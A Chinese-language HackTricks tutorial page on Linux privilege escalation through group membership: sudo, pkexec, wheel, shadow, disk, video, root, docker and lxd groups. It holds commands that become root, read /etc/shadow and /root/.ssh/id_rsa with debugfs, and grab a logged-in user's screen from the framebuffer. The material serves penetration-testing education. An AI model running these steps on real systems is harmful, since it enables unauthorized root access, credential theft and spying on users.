<details>

<summary><strong>从零到英雄学习 AWS 黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>


# Sudo/Admin 组

## **PE - 方法 1**

**有时**，**默认情况下（或因为某些软件需要）** 在 **/etc/sudoers** 文件中可以找到以下几行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着**任何属于sudo或admin组的用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root，你只需执行**：
```text
sudo su
```
## PE - 方法 2

找到所有的 suid 二进制文件，并检查是否存在 **Pkexec** 二进制文件：
```bash
find / -perm -4000 2>/dev/null
```
```markdown
如果你发现二进制文件 `pkexec` 是一个 SUID 二进制文件，并且你属于 `sudo` 或 `admin` 组，你可能可以使用 `pkexec` 作为 `sudo` 执行二进制文件。
检查以下内容：
```
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里，您会发现哪些组被允许执行 **pkexec**，并且在某些linux中**默认情况下**可能会**出现**一些组，如 **sudo 或 admin**。

要**成为root，您可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果您尝试执行 **pkexec** 并且收到以下**错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**并不是因为你没有权限，而是因为你没有通过GUI连接**。对于这个问题，这里有一个解决方法：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**两个不同的ssh会话**：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
```
{% endcode %}

{% code title="session2" %}
```
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel 组

**有时**，**默认情况下**在 **/etc/sudoers** 文件中你可以找到这行内容：
```text
%wheel	ALL=(ALL:ALL) ALL
```
这意味着**任何属于wheel组的用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root，你只需执行**：
```text
sudo su
```
# Shadow 组

属于 **shadow 组** 的用户可以**读取** **/etc/shadow** 文件：
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
```markdown
因此，阅读文件并尝试**破解一些哈希**。

# 磁盘组

这种权限几乎**等同于root访问权限**，因为您可以访问机器内的所有数据。

文件：`/dev/sd[a-z][1-9]`
```
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用debugfs您还可以**写入文件**。例如，要将`/tmp/asd1.txt`复制到`/tmp/asd2.txt`，您可以执行：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
```markdown
然而，如果你尝试**写入由root拥有的文件**\(如 `/etc/shadow` 或 `/etc/passwd`\)，你会遇到"**权限被拒绝**"的错误。

# 视频组

使用命令 `w`，你可以找到**谁登录了系统**，它会显示如下输出：
```
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 物理登录** 到机器上的一个终端。

**video 组** 有权查看屏幕输出。基本上你可以观察屏幕。为此，你需要**抓取屏幕上的当前图像**的原始数据，并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到此屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开** **原始图像**，您可以使用 **GIMP**，选择 **`screen.raw`** 文件并选择文件类型为 **原始图像数据**：

![](../../.gitbook/assets/image%20%28208%29.png)

然后修改宽度和高度为屏幕使用的尺寸，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：

![](../../.gitbook/assets/image%20%28295%29.png)

# Root 组

看起来默认情况下，**root 组的成员**可能有权限**修改**一些**服务**配置文件、一些**库**文件或**其他有趣的东西**，这些都可能被用来提升权限...

**检查 root 组成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker 组

您可以将宿主机的根文件系统挂载到实例的卷中，因此当实例启动时，它会立即加载一个 `chroot` 到该卷。这实际上让您获得了机器的 root 权限。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd 组

[lxc - 权限提升](lxd-privilege-escalation.md)



<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
